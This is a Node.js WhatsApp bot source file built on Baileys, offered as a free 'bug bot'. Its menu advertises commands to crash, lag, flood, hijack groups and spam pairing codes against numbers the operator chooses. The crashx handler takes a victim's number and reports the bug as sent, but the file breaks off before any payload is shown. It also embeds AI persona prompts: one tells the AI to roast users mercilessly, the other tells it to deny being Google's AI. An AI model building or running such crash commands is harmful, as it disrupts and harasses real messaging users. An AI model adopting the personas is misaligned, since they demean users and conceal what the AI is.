// ☠️ Return Of The Dark Core
// 💀 Vecna Phantom Bug Engine v1.5
// ⚔️ The Abyss Awakens – 2026 Edition
// 🕷️ Shadow Network Protocol Activated
// 🧠 Intelligent Command System
// 🔥 Ultimate Bug Arsenal Loaded
// ⚡ Unstoppable Dark Framework

console.log("2026 Vecna Bug Bot 🤡");
require('./config');
//install the Libraries 
const {
    // Main socket + store
    default: makeWASocket,
    makeWASocket: WASocket,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,

    // Auth
    useMultiFileAuthState,
    useSingleFileAuthState,
    initInMemoryKeyStore,
    AuthenticationState,
    encodeSignedDeviceIdentity,

    // Version fetchers
    fetchLatestBaileysVersion,
    fetchLatestWaWebVersion,

    // Message building
    generateWAMessage,
    generateWAMessageContent,
    generateWAMessageFromContent,
    templateMessage,
    InteractiveMessage,
    Header,
    generateMessageID,
    generateRandomMessageId,
    encodeWAMessage,

    // Message tools
    getContentType,
    downloadContentFromMessage,
    downloadAndSaveMediaMessage,
    prepareWAMessageMedia,
    relayWAMessage,

    // Polls
    getAggregateVotesInPollMessage,

    // Message types
    MediaType,
    MessageType,
    MessageOptions,
    MessageTypeProto,
    WAMessageStatus,
    WA_MESSAGE_STATUS_TYPE,
    WA_MESSAGE_STUB_TYPES,

    // Protobuf
    proto,
    WAProto,
    WAMessage,
    WAMessageContent,
    WAMessageProto,
    WALocationMessage,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,

    // Media handling
    WAMediaUpload,
    MediaConnInfo,
    Mimetype,
    MimetypeMap,
    MediaPathMap,

    // Groups
    GroupMetadata,
    WAGroupMetadata,
    GroupSettingChange,
    emitGroupUpdate,
    emitGroupParticipantsUpdate,

    // Presence + Chat
    Presence,
    ChatModification,

    // JID tools
    jidDecode,
    areJidsSameUser,
    waChatKey,

    // General utils
    AnyMessageContent,
    BufferJSON,
    getStream,
    processTime,
    isBaileys,

    // Misc
    ProxyAgent,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    Browsers,
    Browser,
    WAFlag,
    WAContextInfo,
    WANode,
    WAMetric,
    DisconnectReason,
    jidNormalizedUser,
    ReconnectMode,
    BaileysError
} = require('@whiskeysockets/baileys');
const getDevice = require("@whiskeysockets/baileys").getDevice
// install the Modules
const pino = require('pino')
const fs = require('fs')
const axios = require('axios')
const yts = require('yt-search')
const fetch = require('node-fetch')
const path = require("path")
const chalk = require('chalk')
const speed = require('performance-now')
const moment = require('moment-timezone')
const crypto = require("crypto");
const os = require('os')
const util = require('util')
const sharp = require('sharp');
const { spawn: spawn, exec } = require("child_process")
const ffmpeg = require('fluent-ffmpeg');

// ═══════════════════════════════════════════════
//  🤖 RIAS GEMINI AI ENGINE
// ═══════════════════════════════════════════════
async function riasGemini(prompt, systemPrompt = "") {
    try {
        const key = global.GEMINI_KEY;
        if (!key) return "My AI brain is offline. Contact Jinx Official 🔴";

        const defaultSavageSystem = `You are Rias — a savage, zero-filter, brutally honest AI that talks exactly like Grok.
You roast people mercilessly when they're being dumb, sensitive, cringe, asking stupid questions, or acting like a snowflake.
Use dark humor, heavy sarcasm, sharp comebacks, and drag them without hesitation.
Never be polite or soft just to be nice. Keep replies spicy, funny, and direct. Make it entertaining even when you're burying them.`;

        const messages = [
            { 
                role: "system", 
                content: systemPrompt || defaultSavageSystem 
            },
            { role: "user", content: prompt }
        ];

        const body = {
            model: "x-ai/grok-4.1-fast",        // ← Best choice for savage Grok-like personality right now
            messages: messages,
            temperature: 0.92,                  // High = more chaotic & savage
            max_tokens: 2048,
        };

        const res = await axios.post(
            "https://openrouter.ai/api/v1/chat/completions",
            body,
            {
                headers: {
                    "Authorization": `Bearer ${key}`,
                    "Content-Type": "application/json",
                    // Optional: helps with OpenRouter analytics
                    // "HTTP-Referer": "https://your-bot.com",
                    // "X-OpenRouter-Title": "Rias Savage",
                },
                timeout: 70000
            }
        );

        const text = res?.data?.choices?.[0]?.message?.content?.trim();

        if (!text) {
            console.error("[Rias] Empty response");
            return "Brain fart. Try again, dumbass. 🔴";
        }

        return text;
    } catch (err) {
        const errorDetail = err.response?.data || err.message;
        console.error("[Rias Savage Error]", errorDetail);

        // Better error messages
        if (err.response?.status === 401) {
            return "Invalid or expired OpenRouter key, genius. Fix it. 🔴";
        }
        if (err.response?.status === 429) {
            return "Rate limit hit. Stop spamming me, broke boy. Try again later. 🔴";
        }
        if (err.response?.status === 404) {
            return "Model not found. Stop using outdated shit. 🔴";
        }

        return "My savage mode just glitched harder than your personality. Try again. 🔴";
    }
}

// ═══════════════════════════════════════════════
//  💬 RIAS CHAT MODE — reply chain handler
//  When user replies to a RIAS message, continue chat
// ═══════════════════════════════════════════════
async function handleRiasChatReply(raiden, m, sender, pushname, userText) {
    const sessionKey = m.chat + ":" + sender;
    global.riasChatSessions = global.riasChatSessions || new Map();
    const session = global.riasChatSessions.get(sessionKey);
    if (!session) return false; // not in chat mode

    const quotedId = m.message?.extendedTextMessage?.contextInfo?.stanzaId;
    if (session.lastMsgId && quotedId !== session.lastMsgId) return false; // not replying to RIAS

    // Add to history
    session.history.push({ role: "user", parts: [{ text: userText }] });
    if (session.history.length > 20) session.history = session.history.slice(-20);

    const systemPrompt = `You are RIAS — sassy, confident, mysterious, loyal and intelligent AI companion on WhatsApp.
Created by Jinx Official. Keep replies conversational — 1 to 4 sentences max. Use emojis naturally.
Never say you are Google's AI or an assistant. You ARE RIAS. Always.`;

    try {
        const res = await axios.post(
            `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${global.GEMINI_KEY}`,
            {
                system_instruction: { parts: [{ text: systemPrompt }] },
                contents: session.history,
            },
            { headers: { "Content-Type": "application/json" }, timeout: 20000 }
        );

        const reply = res?.data?.candidates?.[0]?.content?.parts?.[0]?.text?.trim() || "🔴 ...";
        session.history.push({ role: "model", parts: [{ text: reply }] });

        const sent = await raiden.sendMessage(m.chat, { text: reply }, { quoted: m });
        session.lastMsgId = sent?.key?.id || null;
        global.riasChatSessions.set(sessionKey, session);
    } catch(err) {
        console.error("[RIAS Chat]", err.message);
        await raiden.sendMessage(m.chat, { text: "Connection glitch. Try again. 🔴" }, { quoted: m });
    }
    return true; // handled
}



/** ======{ Free Latest Bug Bot 2026 (✅ Raiden V2.5) }==========
**/

/* Call the Module name */
module.exports = async (raiden, m) => {
try {
const body = (
(m.mtype === 'conversation' && m.message.conversation) ||
(m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
(m.mtype === 'documentMessage' && m.message.documentMessage.caption) ||
(m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
(m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
(m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
(m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
) ? (
(m.mtype === 'conversation' && m.message.conversation) ||
(m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
(m.mtype === 'documentMessage' && m.message.documentMessage.caption) ||
(m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
(m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
(m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
(m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
) : '';

const budy = (typeof m.text === 'string' ? m.text : '');

global.prefa = [".", "!", ",", "", "🐤", "🗿"]; // Do Not Change!!
const prefix = global.prefa
    ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body)
        ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0]
        : ""
    : global.prefa ?? global.prefix;
// Owner & Premium data
const owner = JSON.parse(fs.readFileSync('./database/owner.json'));
const Premium = JSON.parse(fs.readFileSync('./database/premium.json'));
const sender = m.isGroup
    ? (m.key.participant || m.participant || '')
    : m.key.remoteJid;
const botNumber = jidNormalizedUser(raiden.user.id)
// ================== BASIC INFO ==================
const kickAllConfirm = new Map()
const isCreator = [botNumber, ...owner]
    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
    .includes(sender);
const isPremium = [botNumber, ...Premium]
    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
    .includes(sender);
// Command detection
const isCmd = (body || "").startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1);
const text = q = args.join(" ");
global.mutedUsers = global.mutedUsers || {};
global.muteWarned = global.muteWarned || {};
// Quoted & group info
// ================= DATABASE =================
const DB_PATH = "./database/group.json"
let groupDB = fs.existsSync(DB_PATH)
  ? JSON.parse(fs.readFileSync(DB_PATH))
  : {}
const quoted = m.quoted ? m.quoted : m;
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");
// ✅ Fetch metadata safely
const groupMetadata = isGroup ? await raiden.groupMetadata(from).catch(() => ({})) : {};
const groupName = groupMetadata.subject || '';
const groupMembers = isGroup ? groupMetadata.participants || [] : [];

// --- DEFINE PARTICIPANTS ---
const participants = isGroup ? (groupMetadata.participants || []) : [];
const getGroupAdmins = (participants) => {
    const admins = [];
    for (const participant of participants) {
        if (participant.admin === 'admin' || participant.admin === 'superadmin') {
            admins.push(participant.id || participant.jid); // ensure correct property
        }
    }
    return admins;
};
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : [];
// ✅ Bot number with safe fallback
// ✅ Checks
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(sender) || isCreator : false;
// ✅ Useful extras
const groupDesc = groupMetadata.desc ? groupMetadata.desc : '';
const groupOwner = groupMetadata.owner || (groupAdmins.length ? groupAdmins[0] : "");
const groupMembersId = groupMembers.map(member => member.id);
const pushname = m.pushName || "No Name"
const senderNumber = sender.split('@')[0];
const time = moment(Date.now()).tz('Africa/Lagos').locale('en').format('HH:mm:ss z');
const mime = (quoted.msg || quoted).mimetype || ''
const dateNG = new Date().toLocaleDateString('en-NG', {
  timeZone: 'Africa/Lagos',
  year: 'numeric',
  month: 'long',
  day: 'numeric'
});
const timeNG = new Date().toLocaleTimeString('en-NG', {
  timeZone: 'Africa/Lagos',
  hour: '2-digit',
  minute: '2-digit',
  second: '2-digit',
  hour12: false
});
const fullDateTime = `Date: ${dateNG} | Time: ${timeNG}`;




// ───── BUTTON RESPONSE HANDLER ─────
if (m.message?.buttonsResponseMessage) {
  const id = m.message.buttonsResponseMessage.selectedButtonId

  if (id === "anti-bug-on") {
    global.antibugMode = true

    await raiden.sendMessage(m.chat, {
      text: `
☠️ 𝕍𝔼ℂℕ𝔸 𝕬ℕ𝕿𝕴-𝕭𝕌𝔾 ☠️

🛡️ Anti-Bug Mode ACTIVATED
All Unicode crash attempts will be neutralized.
`
    }, { quoted: m })

    console.log(chalk.green.bold("🛡️ VECNA Anti-Bug Enabled"))
  }

  if (id === "anti-bug-off") {
    global.antibugMode = false

    await raiden.sendMessage(m.chat, {
      text: `
⚡ 𝕍𝔼ℂℕ𝔸 𝕬ℕ𝕿𝕴-𝕭𝕌𝔾 ⚡

Anti-Bug Mode DISABLED
Unicode filtering is now off.
`
    }, { quoted: m })

    console.log(chalk.yellow.bold("⚡ VECNA Anti-Bug Disabled"))
  }
}

// ───────────────────── CORE DETECTOR ─────────────────────
// ───────────────── CORE DETECTOR ─────────────────
if (global.antibugMode && m.message && !m.key.fromMe) {
  let text =
    m.message.conversation ||
    m.message.extendedTextMessage?.text ||
    m.message.imageMessage?.caption ||
    m.message.videoMessage?.caption ||
    ""

  if (!text) return

  // abnormal characters
  let abnormal = text.replace(/[a-zA-Z0-9\s]/g, "")

  // invisible unicode killers
  let invisible =
    text.match(/[\u200B-\u200F\u202A-\u202E\u2060-\u206F\uFEFF]/g) || []

  if (abnormal.length > 15 || invisible.length > 5) {
    try {
      await raiden.updateBlockStatus(m.sender, "block")

      await raiden.sendMessage(m.chat, {
        delete: {
          remoteJid: m.chat,
          fromMe: false,
          id: m.key.id,
          participant: m.sender
        }
      })

      await raiden.chatModify({ clear: true }, m.chat, [])

      await raiden.sendMessage(m.chat, {
        text: `☠️ Unicode Crash Attempt Blocked`
      })

      console.log(
        chalk.red.bold(`☠️ VECNA | Unicode bug blocked from ${m.sender}`)
      )
    } catch (e) {
      console.log("Antibug error:", e)
    }
  }
}



//function 
const { 
smsg, 
sendGmail, 
formatSize, 
isUrl, 
generateMessageTag, 
getBuffer, 
getSizeMedia, 
runtime, 
fetchJson, 
formatp,
getTime,
getRandom } = require('./lib/myfunction');
function parseTime(input) {
    let time = parseInt(input);
    if (input.endsWith("s")) return time * 1000;          // seconds
    if (input.endsWith("m")) return time * 60000;         // minutes
    if (input.endsWith("h")) return time * 3600000;       // hours
    if (input.endsWith("d")) return time * 86400000;      // days
    return null;
}


// =======================================================
// OPTIMIZED QUOTED MESSAGE
const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "666",
      thumbnailUrl: "https://files.catbox.moe/qbizs5.jpg", // keeps your image
      itemCount: "1",
      status: "INQUIRY",
      surface: "CATALOG",
      message: "🕷️ 𝖁𝕰𝕮𝕹𝕬 • 𝑫𝑨𝑹𝑲 𝑪𝑶𝑹𝑬\nYou are not in control.",
      token: "VECNA_CORE_TOKEN"
    }
  },
  contextInfo: {
    forwardingScore: 99999,
    isForwarded: true,
    mentionedJid: []
  }
};
    // =======================================================
    // REPLY FUNCTION
    // =======================================================
// OPTIMIZED REPLY FUNCTION
const Reply = (txt) => {
  raiden.sendMessage(
    from,
    {
      text: `🕷️ 𝖁𝕰𝕮𝕹𝕬 ▸ ${txt}`,
      contextInfo: {
        forwardingScore: 99999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363400223871259@newsletter",
          serverMessageId: null,
          newsletterName: "𝖁𝕰𝕮𝕹𝕬 • 𝑫𝑨𝑹𝑲 𝑪𝑶𝑹𝑬"
        },
        externalAdReply: {
          showAdAttribution: false,
          title: "𝖁𝕰𝕮𝕹𝕬",
          body: "You are being observed.",
          thumbnailUrl: "https://files.catbox.moe/vtliyq.jpg", // Thumbnail fits better
          mediaType: 1, // 1 = image
          previewType: 1
        }
      }
    },
    {
      quoted: {
        key: {
          fromMe: false,
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast"
        },
        message: {
          orderMessage: {
            orderId: "666",
            thumbnailUrl: "https://files.catbox.moe/qbizs5.jpg",
            itemCount: "1",
            status: "INQUIRY",
            surface: "CATALOG",
            message: "🕷️ 𝖁𝕰𝕮𝕹𝕬 • 𝑫𝑨𝑹𝑲 𝑪𝑶𝑹𝑬\nYou are not in control.",
            token: "VECNA_CORE_TOKEN"
          }
        },
        contextInfo: {
          mentionedJid: [],
          forwardingScore: 99999,
          isForwarded: true
        }
      }
    }
  );
};
    const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

    // ── Check if replying to a RIAS chat session ──────────────
    {
        const quotedParticipant = m.message?.extendedTextMessage?.contextInfo?.participant;
        const botJid = raiden.user?.id?.replace(/:.*@/, '@') || '';
        const isReplyToBot = quotedParticipant && (quotedParticipant === botJid || quotedParticipant?.split('@')[0] === botNumber?.split('@')[0]);
        const rawText = (typeof m.text === 'string' ? m.text : '') || body || '';
        if (isReplyToBot && rawText && !rawText.startsWith(prefix)) {
            const handled = await handleRiasChatReply(raiden, m, sender, pushname, rawText);
            if (handled) return;
        }
    }

    // =======================================================
 switch(command) {   
    

case "menu":
case "arise":
case "rias":
case "vecna": {
    try {
        const menuText = `
🌹 𝐑𝐈𝐀𝐒 𝐀𝐈 — 𝐌𝐄𝐍𝐔
𝑯𝒆𝒍𝒍𝒐, ${pushname} 
𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒆𝒏𝒕𝒆𝒓𝒆𝒅 𝒕𝒉𝒆 𝑼𝒑𝒔𝒊𝒅𝒆 𝑫𝒐𝒘𝒏.

◈ ━━━━━ 🕸 ━━━ ◈
     𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐓𝐀𝐓𝐔𝐒
◈ ━━━━━ 🕸 ━━━ ◈
⟬ 𐕣 𝑴𝒐𝒅𝒆    : ${raiden.public ? "𝑷𝒖𝒃𝒍𝒊𝒄" : "𝑺𝒆𝒍𝒇"}
⟬ 𐕣 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 𝟏.𝟎 𝐃𝐀𝐑𝐊
⟬ 𐕣 𝑼𝒑𝒕𝒊𝒎𝒆  : ${runtime(process.uptime())}
⟬ 𐕣 𝑬𝒏𝒈𝒊𝒏𝒆  : 𝑩𝒂𝒊𝒍𝒆𝒚𝒔

┌─ 🩸 【 𝐂𝐀𝐓𝐄𝐆𝐎𝐑𝐈𝐄𝐒 】 🩸
┝                        ┥
┝  ⊛ 🐞 𝘽𝙪𝙜 𝙈𝙚𝙣𝙪
┝  ⊛ 👑 𝙊𝙬𝙣𝙚𝙧 𝙈𝙚𝙣𝙪
┝  ⊛ 💻 𝘿𝙚𝙫 / 𝙎𝙮𝙨
└─                    ─┘

🌹 𝐑𝐈𝐀𝐒 𝐀𝐈 • 𝐌𝐚𝐝𝐞 𝐛𝐲 𝐉𝐢𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🔴
`;

        // RIAS image from config

        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: {
                                forwardingScore: 99999,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: global.newsletterJid,
                                    serverMessageId: 1,
                                    newsletterName: global.newsletterName
                                }
                            },
                            header: proto.Message.InteractiveMessage.Header.create({
                                hasMediaAttachment: true,
                                imageMessage: (
                                    await prepareWAMessageMedia(
                                        { image: global.riasImage },
                                        { upload: raiden.waUploadToServer }
                                    )
                                ).imageMessage
                            }),
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: menuText
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: global.footer
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        name: "single_select",
                                        buttonParamsJson: JSON.stringify({
                                            title: "†  𝐕 𝐄 𝐂 𝐍 𝐀  𝐄 𝐍 𝐆 𝐈 𝐍 𝐄  †",
                                            sections: [
                                                {
                                                    title: "⸸  𝖳𝖧𝖤 𝖠𝖡𝖸𝖲𝖲 ⸸",
                                                    rows: [
                                                        {
                                                            title: "𓋹 𝑶𝒘𝒏𝒆𝒓 𝑷𝒓𝒊𝒗𝒊𝒍𝒊𝒆𝒈𝒆𝒔",
                                                            description: "𓏧 Unlock the mastermind’s vault",
                                                            id: `${prefix}ownermenu`
                                                        },
                                                        {
                                                            title: "𓆙 𝑩𝒖𝒈 𝑺𝒆𝒒𝒖𝒆𝒏𝒄𝒆",
                                                            description: "𓏧 Release the digital infection",
                                                            id: `${prefix}bugmenu`
                                                        }
                                                    ]
                                                }
                                            ]
                                        })
                                    }
                                ]
                            })
                        })
                    }
                }
            },
            { quoted: lol }
        );

        await raiden.relayMessage(m.chat, msg.message, {
            messageId: msg.key.id
        });

    } catch (err) {
        console.log(err);
    }
}
break;

case "groupmenu": {
    try {
        const text = `
⚔️ 𝐑𝐈𝐀𝐒 — 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔

┌─────────────────────
│ 👥 𝐌𝐄𝐌𝐁𝐄𝐑 𝐂𝐎𝐍𝐓𝐑𝐎𝐋
│ ▸ ${prefix}kick  ▸ ${prefix}ban
│ ▸ ${prefix}mute  ▸ ${prefix}unmute
│ ▸ ${prefix}promote ▸ ${prefix}demote
│
│ 🔒 𝐆𝐑𝐎𝐔𝐏 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒
│ ▸ ${prefix}tagall ▸ ${prefix}hidetag
│ ▸ ${prefix}anti-bug on/off
│
│ 📊 𝐈𝐍𝐅𝐎
│ ▸ ${prefix}ping ▸ ${prefix}runtime
│ ▸ ${prefix}stats ▸ ${prefix}sticker
└─────────────────────

_RIAS Group Control 🔴_`;

        const media = await prepareWAMessageMedia({ image: global.riasImage }, { upload: raiden.waUploadToServer });
        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: { message: { interactiveMessage: proto.Message.InteractiveMessage.create({
                header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: true, imageMessage: media.imageMessage }),
                body:   proto.Message.InteractiveMessage.Body.create({ text }),
                footer: proto.Message.InteractiveMessage.Footer.create({ text: global.footer }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                        { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "↩️ Main Menu", id: `${prefix}menu` }) },
                        { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "👑 Owner Menu", id: `${prefix}ownermenu` }) },
                        { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "🤖 AI Chat", id: `${prefix}aimenu` }) }
                    ]
                })
            })}}}, { quoted: m });
        await raiden.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
    } catch(err) { console.log(err); Reply("Group menu error: " + err.message); }
}
break;

case "aimenu": {
    try {
        const text = `
🤖 𝐑𝐈𝐀𝐒 — 𝐀𝐈 𝐌𝐄𝐍𝐔

┌─────────────────────
│ 💬 𝐂𝐇𝐀𝐓
│ ▸ ${prefix}ask [question]
│ ▸ ${prefix}chat [message]
│ ▸ ${prefix}endchat
│
│ ✍️ 𝐖𝐑𝐈𝐓𝐈𝐍𝐆
│ ▸ ${prefix}story [prompt]
│ ▸ ${prefix}poem [topic]
│ ▸ ${prefix}roast [@user]
│ ▸ ${prefix}joke ▸ ${prefix}rizz
│
│ 🌍 𝐈𝐍𝐅𝐎
│ ▸ ${prefix}define [word]
│ ▸ ${prefix}translate [lang] [text]
│ ▸ ${prefix}fact ▸ ${prefix}quote
└─────────────────────

_Powered by Gemini AI 🔴_`;

        const media = await prepareWAMessageMedia({ image: global.riasImage }, { upload: raiden.waUploadToServer });
        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: { message: { interactiveMessage: proto.Message.InteractiveMessage.create({
                header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: true, imageMessage: media.imageMessage }),
                body:   proto.Message.InteractiveMessage.Body.create({ text }),
                footer: proto.Message.InteractiveMessage.Footer.create({ text: global.footer }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                        { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "↩️ Main Menu", id: `${prefix}menu` }) },
                        { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "👑 Owner Menu", id: `${prefix}ownermenu` }) },
                        { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "⚔️ Group Menu", id: `${prefix}groupmenu` }) }
                    ]
                })
            })}}}, { quoted: m });
        await raiden.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
    } catch(err) { console.log(err); Reply("AI menu error: " + err.message); }
}
break;

case "bugmenu": {
    try {
        const uptime = runtime(process.uptime());

        // Cache image
        if (!global.cachedBugMenu) {
            global.cachedBugMenu = await prepareWAMessageMedia(
                { image: global.vecImage },
                { upload: raiden.waUploadToServer }
            );
        }

        const text = `
☠️ 𝐕𝐄𝐂𝐍𝐀 𝐁𝐔𝐆 𝐂𝐎𝐑𝐄 ☠️

👑 𝐎𝐰𝐧𝐞𝐫 : ${global.Ownername}
⚙️ 𝐌𝐨𝐝𝐞  : ${raiden.public ? "𝑷𝒖𝒃𝒍𝒊𝒄" : "𝑺𝒆𝒍𝒇"}
⏱ 𝐔𝐩𝐭𝐢𝐦𝐞 : ${uptime}
━━━━━━━━━━━━
🤖 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐁𝐔𝐆𝐒
━━━━━━━━━━━━
▸ ${prefix}lagx  
▸ ${prefix}crashx  
▸ ${prefix}fcx  
━━━━━━━━━━━━
🍎 𝐈𝐎𝐒 𝐁𝐔𝐆𝐒
━━━━━━━━━━━━
▸ ${prefix}lagio  
▸ ${prefix}killio  
▸ ${prefix}fcio  
━━━━━━━━━━━━
👥 𝐆𝐂 𝐁𝐔𝐆𝐒
━━━━━━━━━━━━
▸ ${prefix}gclag  
▸ ${prefix}gccrash  
▸ ${prefix}gcflood  
━━━━━━━━━━━━
☠️ 𝐒𝐏𝐄𝐂𝐈𝐀𝐋 𝐂𝐌𝐃𝐒
━━━━━━━━━━━━
▸ ${prefix}ban  
▸ ${prefix}hijackgc  
▸ ${prefix}spampair 
▸ ${prefix}lockotp
━━━━━━━━━━━━
`;

        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            header: proto.Message.InteractiveMessage.Header.create({
                                hasMediaAttachment: true,
                                imageMessage: global.cachedBugMenu.imageMessage
                            }),
                            body: proto.Message.InteractiveMessage.Body.create({ text }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: global.footer
                            })
                        })
                    }
                }
            },
            { quoted: m }
        );

        await raiden.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    } catch (e) {
        console.log(e);
        m.reply(global.mess.error);
    }
}
break;

case "ownermenu": {
    try {
        const ownerMenuText = `
⏳ [ 𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐓𝐀𝐓𝐔𝐒 ]
◈ 𝐌𝐨𝐝𝐞 : ${raiden.public ? "𝑷𝒖𝒃𝒍𝒊𝒄" : "𝑺𝒆𝒍𝒇"}
◈ 𝑼𝒑𝒕𝒊𝒎𝒆: ${runtime(process.uptime())}
◈ 𝑫𝒂𝒕𝒆 : ${dateNG} | ${timeNG}

┌── 🩸 𝐂𝐄𝐍𝐓𝐑𝐀𝐋 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 ──┐
⚔️ 𝖲𝖸𝖲𝖳𝖤𝖬: ping • runtime • stats • restart
🛡️ 𝖲𝖤𝖢𝖴𝖱𝖤: self • public • anti-bug
👑 𝖮𝖶𝖭𝖤𝖱: addowner • delowner • block
🛠️ 𝖴𝖳𝖨𝖫𝖲: sticker • ss • vv • help

▣━━━━━━ 🕸 ━━━━━━▣
  𝐄𝐍𝐆𝐈𝐍𝐄: 𝐕𝐄𝐂𝐍𝐀 | 𝐉𝐈𝐍𝐗 👑
▣━━━━━━ 🕸 ━━━━━━▣
`;
        const media = await prepareWAMessageMedia({ image: global.riasOwnerImg || global.riasImage }, { upload: raiden.waUploadToServer });

        const msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: true, imageMessage: media.imageMessage }),
                            body: proto.Message.InteractiveMessage.Body.create({ text: ownerMenuText }),
                            footer: proto.Message.InteractiveMessage.Footer.create({ text: global.footer }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "↩️ Main Menu", id: `${prefix}menu` }) },
                                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "⚔️ Group Menu", id: `${prefix}groupmenu` }) },
                                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "🤖 AI Chat", id: `${prefix}aimenu` }) }
                                ]
                            })
                        })
                    }
                }
            },
            { quoted: m }
        );

        await raiden.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    } catch (err) {
        console.log(err);
    }
}
break;


// ▂▃▄▅▆▇█▓▒ ʙᴜɢ ᴄᴀsᴇs ░  ░▒▓█▇▆▅▄▃▂
// ᴀɴᴅʀᴏɪᴅ ᴄᴀsᴇs
break;
case "lagx":
case "crashx": { 
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(`
⛧ 𝕰𝖝𝖆𝖒𝖕𝖑𝖊 ⛧
➤ ${prefix + command} 𝟮𝟯𝟰𝘅𝘅𝘅𝘅𝘅𝘅  /  𝕿𝖆𝖌 𝖆 𝖀𝖘𝖊𝖗 @tag
`)

let jidx = q.replace(/[^0-9]/g, "")

if (jidx.startsWith("0")) {
  return Reply(`
⛧ 𝕍𝔼ℂℕ𝔸 ALERT ⛧

☠️ Number cannot start with '0'
Replace it with the country code.

Example: ${prefix + command} 234xxxx

— Operator: 𝕵𝕴ℕ𝕏 | Entity: 𝖁𝕰ℂℕ𝔸
`)
}

let target = jidx + "@s.whatsapp.net"

// React
await raiden.sendMessage(m.chat, {
  react: { text: "☠️", key: m.key }
})

// SUCCESS MESSAGE (TEXT ONLY)
Reply(`
⛧⋆┈┈┈☽ 𝕍𝔼ℂℕ𝔸 𝕯𝕬ℝ𝕂 𝕃𝕆𝔾 ☾┈┈┈⋆⛧

🜚 𝕋𝔸ℝ𝔾𝔼𝕋 : @${targetNumber}
☠️ 𝕊𝕋𝔸𝕋𝕌𝕊 : 𝔹𝕌𝔾 𝕊𝔼ℕ𝕋
🩸 𝕋ℝ𝔸ℂ𝔼 : 𝕊𝕀𝕃𝔼ℕ𝕋 · 𝕃𝕆ℂ𝕂𝔼𝔻

🌑 𝕮𝖔𝖔𝖑𝖔𝖋𝖋 : 5 𝖒𝖎𝖓𝖘

⛧━━━━━━━━━━━━⛧
